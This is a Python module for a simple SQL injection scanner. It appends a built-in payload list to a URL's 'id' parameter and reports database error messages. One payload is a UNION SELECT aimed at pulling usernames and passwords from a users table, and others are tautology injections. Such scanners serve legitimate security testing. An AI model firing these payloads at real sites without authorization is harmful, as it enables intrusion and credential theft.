# modules/sql_injection.py

import requests
from colorama import Fore

# You can replace this with loading from a file if you want
payloads = [
    "'", 
    "' OR '1'='1", 
    "' UNION SELECT NULL, username, password FROM users --",
    '" OR "1"="1" --',
    "1' OR 1=1 --"
]

def scan(url, payload_list=None):
    """
    Scan URL for SQL injection using provided payloads (or default).
    Yields results live as they're found.
    """
    if payload_list is None:
        payload_list = payloads

    yield f"[SQL Injection Test] Target: {url}"

    vulnerable_found = False

    for payload in payload_list:
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            errors = ["mysql", "syntax error", "warning", "ora-"]

            if any(error in response.text.lower() for error in errors):
                message = f"[!] Possible SQL Injection at: {test_url}"
                print(Fore.RED + message + Fore.RESET)
                yield message
                vulnerable_found = True
        except requests.exceptions.RequestException:
            # You can choose to yield or skip errors here
            continue

    if not vulnerable_found:
        message = "[+] No SQL Injection vulnerabilities found."
        print(Fore.GREEN + message + Fore.RESET)
        yield message
